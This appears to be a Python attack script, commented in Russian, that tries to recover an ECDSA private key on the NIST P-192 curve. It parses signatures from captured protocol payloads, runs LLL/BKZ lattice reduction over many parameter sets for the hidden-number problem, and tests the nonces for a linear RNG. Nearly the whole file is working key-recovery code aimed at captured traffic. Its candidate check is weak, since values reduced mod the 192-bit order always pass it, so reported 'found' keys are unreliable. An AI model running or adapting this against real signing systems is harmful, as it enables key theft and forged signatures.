#!/usr/bin/env python3
"""
СВЕРХБЫСТРАЯ LATTICE ATTACK с использованием fpylll

fpylll - это библиотека C++ для решеток, работающая в 100-1000 раз быстрее Python.
Позволяет перебирать параметры и использовать большие размерности.
"""

import csv
import hashlib
from fpylll import IntegerMatrix, LLL, GSO, BKZ
from fpylll.algorithms.bkz2 import BKZReduction
from ecdsa.curves import NIST192p

CURVE = NIST192p
ORDER = CURVE.order
G = CURVE.generator

def inverse_mod(a, m):
    return pow(a, -1, m)

def fold_sha256_to_192(sha256_hash):
    h = bytearray(sha256_hash)
    for i in range(8):
        h[i] ^= h[i + 24]
    return bytes(h[:24])

def solve_with_fpylll(sigs, bits_bias):
    """
    Решает HNP с помощью fpylll
    """
    n = ORDER
    m = len(sigs)
    
    # Вычисляем t и u
    t = []
    u = []
    for sig in sigs:
        s_inv = inverse_mod(sig['s'], n)
        t_val = (s_inv * sig['r']) % n
        u_val = (s_inv * sig['z']) % n
        t.append(t_val)
        u.append(u_val)
    
    # Bound B = 2^bits_bias
    B = 2**bits_bias
    
    print(f"Построение матрицы {m+2}x{m+2} для bias {bits_bias} бит...")
    
    # Создаем матрицу в fpylll
    M = IntegerMatrix(m + 2, m + 2)
    
    # Заполняем
    # [B*n     0    ...  0    0  0]
    for i in range(m):
        M[i, i] = B * n
        
    # [B*t1  B*t2  ... B*tm  1  0]
    for i in range(m):
        M[m, i] = t[i] * B
    M[m, m] = 1
    
    # [B*u1  B*u2  ... B*um  0  B]
    for i in range(m):
        M[m+1, i] = u[i] * B
    M[m+1, m+1] = B
    
    print("Запуск LLL (fpylll)...")
    
    # LLL редукция
    LLL.reduction(M)
    
    # Можно попробовать BKZ для лучшего результата (но медленнее)
    # BKZ.reduction(M, block_size=10)
    
    print("Анализ результатов...")
    
    candidates = []
    
    for i in range(M.nrows):
        row = M[i]
        
        # Проверяем последний элемент (должен быть ±B)
        last_val = row[m+1]
        if abs(abs(last_val) - B) > B * 0.05:
            continue
            
        if last_val < 0:
            # Инвертируем строку, но в fpylll доступ read-only к элементам через [] часто
            # Проще работать с копией значений
            d_val = -row[m]
        else:
            d_val = row[m]
            
        d_candidate = d_val % n
        
        if d_candidate == 0 or d_candidate >= n - 100:
            continue
            
        # Проверка
        k_values = []
        valid = True
        for j in range(m):
            k_calc = (t[j] * d_candidate + u[j]) % n
            if k_calc.bit_length() > 192: # Грубая проверка
                pass
            k_values.append(k_calc.bit_length())
            
        k_max = max(k_values)
        k_avg = sum(k_values) / len(k_values)
        
        if k_max <= 192:
            candidates.append((d_candidate, k_max, k_avg))
            
    return candidates

def check_polynonce(sigs):
    """
    Проверка на линейную зависимость R (Polynonce)
    Предполагаем R = k (или R линейно зависит от k)
    """
    print("\n--- Проверка Polynonce (Linear RNG) ---")
    n = ORDER
    
    # Берем последовательные подписи
    # Нужно отсортировать по времени? У нас нет времени, но есть порядок в файле.
    # all_sigs уже отсортированы по R, это плохо для polynonce.
    # Нужно загрузить заново без сортировки.
    
    raw_sigs = []
    with open('hnp_capture.csv', 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            sig_hex = row['full_payload_hex'][60:108]
            r = int.from_bytes(bytes.fromhex(sig_hex[:48]), 'big')
            raw_sigs.append(r)
            
    # Пробуем найти A, B такие что r_{i+1} = A * r_i + B (mod n)
    # r1 = A * r0 + B
    # r2 = A * r1 + B
    # r2 - r1 = A * (r1 - r0)
    # A = (r2 - r1) * (r1 - r0)^-1
    
    if len(raw_sigs) < 3:
        return
        
    for i in range(len(raw_sigs) - 2):
        r0 = raw_sigs[i]
        r1 = raw_sigs[i+1]
        r2 = raw_sigs[i+2]
        
        diff1 = (r1 - r0) % n
        diff2 = (r2 - r1) % n
        
        if diff1 == 0: continue
        
        try:
            inv = inverse_mod(diff1, n)
            A = (diff2 * inv) % n
            B = (r1 - A * r0) % n
            
            # Проверяем на i+3
            if i + 3 < len(raw_sigs):
                r3 = raw_sigs[i+3]
                r3_calc = (A * r2 + B) % n
                if r3 == r3_calc:
                    print(f"!!! НАЙДЕНА ЛИНЕЙНАЯ ЗАВИСИМОСТЬ !!!")
                    print(f"A = {hex(A)}")
                    print(f"B = {hex(B)}")
                    print("Это позволяет восстановить k и приватный ключ!")
                    return
        except:
            pass
            
    print("Линейная зависимость не найдена.")

def main():
    print('='*60)
    print('СВЕРХБЫСТРАЯ ATTACK (fpylll) + POLYNONCE')
    print('='*60)
    
    # Загрузка
    all_sigs = []
    with open('hnp_capture.csv', 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            payload = bytes.fromhex(row['full_payload_hex'])
            sha256_field = payload[4:36]
            session_id = payload[36:60]
            sig = payload[60:108]
            
            r = int.from_bytes(sig[0:24], 'big')
            s = int.from_bytes(sig[24:48], 'big')
            
            msg = sha256_field + session_id
            h = hashlib.sha256(msg).digest()
            z_folded = fold_sha256_to_192(h)
            z = int.from_bytes(z_folded, 'big')
            
            all_sigs.append({'r': r, 's': s, 'z': z, 'r_bits': r.bit_length()})
            
    print(f"Всего подписей: {len(all_sigs)}")
    
    # Проверка Polynonce
    check_polynonce(all_sigs)
    
    # Сортируем для Lattice
    all_sigs.sort(key=lambda x: x['r'])
    
    # МАССИРОВАННЫЙ ПЕРЕБОР ПАРАМЕТРОВ
    configs = []
    for n_sigs in range(20, 151, 5):
        for bits in range(185, 193):
            for block_size in [10, 20]:
                configs.append((n_sigs, bits, block_size))
    
    print(f"Всего конфигураций для проверки: {len(configs)}")
    
    for n_sigs, bits, block_size in configs:
        if n_sigs > len(all_sigs):
            continue
            
        print(f"--- BKZ: {n_sigs} sigs, bound 2^{bits}, block={block_size} ---", end='\r')
        
        sigs = all_sigs[:n_sigs]
        
        # Создаем матрицу
        n = ORDER
        m = len(sigs)
        B = 2**bits
        
        M = IntegerMatrix(m + 2, m + 2)
        
        # t и u
        t = []
        u = []
        for sig in sigs:
            s_inv = inverse_mod(sig['s'], n)
            t_val = (s_inv * sig['r']) % n
            u_val = (s_inv * sig['z']) % n
            t.append(t_val)
            u.append(u_val)
            
        for i in range(m):
            M[i, i] = B * n
        for i in range(m):
            M[m, i] = t[i] * B
        M[m, m] = 1
        for i in range(m):
            M[m+1, i] = u[i] * B
        M[m+1, m+1] = B
        
        # Запуск BKZ
        BKZ.reduction(M, BKZ.Param(block_size=block_size))
        
        # Анализ
        for i in range(M.nrows):
            row = M[i]
            last_val = row[m+1]
            if abs(abs(last_val) - B) > B * 0.1:
                continue
            
            if last_val < 0:
                d_val = -row[m]
            else:
                d_val = row[m]
            
            d_candidate = d_val % n
            
            if d_candidate == 0 or d_candidate >= n - 100:
                continue
                
            k_calc = (t[0] * d_candidate + u[0]) % n
            if k_calc.bit_length() <= 192:
                k_values = []
                valid = True
                for j in range(m):
                    k_c = (t[j] * d_candidate + u[j]) % n
                    if k_c.bit_length() > 193:
                        valid = False
                        break
                    k_values.append(k_c.bit_length())
                
                if valid:
                    k_max = max(k_values)
                    k_avg = sum(k_values) / len(k_values)
                    
                    print(f"\n\n✓✓✓ НАЙДЕНО! BKZ block={block_size}, sigs={n_sigs}, bound={bits}")
                    print(f"d: {hex(d_candidate)}")
                    print(f"k: max={k_max}, avg={k_avg:.1f}")
                    return

if __name__ == "__main__":
    main()
